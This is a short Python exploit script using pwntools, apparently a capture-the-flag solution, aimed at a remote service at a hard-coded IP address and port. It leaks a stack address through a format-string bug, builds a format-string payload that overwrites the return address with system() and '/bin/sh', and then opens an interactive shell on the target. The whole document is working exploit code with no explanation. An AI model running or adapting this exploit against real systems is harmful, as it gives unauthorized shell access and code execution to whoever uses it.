from pwn import *

context.log_level = 'debug'
r = remote('13.233.66.116', 6969)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))

stack_offset = 184

# leak stack address
rr('!\n')
ss('%3$x')
rr(':\n\n')
leak = int(rr('\n'),16)

# overwrite ret to system(0x08050bd0) and ret+8 to "/bin/sh"(0x080AE88C)
p = fmtstr_payload(1, {leak-stack_offset: 0x08050bd0, leak-stack_offset+8: 0x080AE88C},  0, 'short')

# trigger fsb and exploit
rr('!\n')
ss(p)
r.interactive()
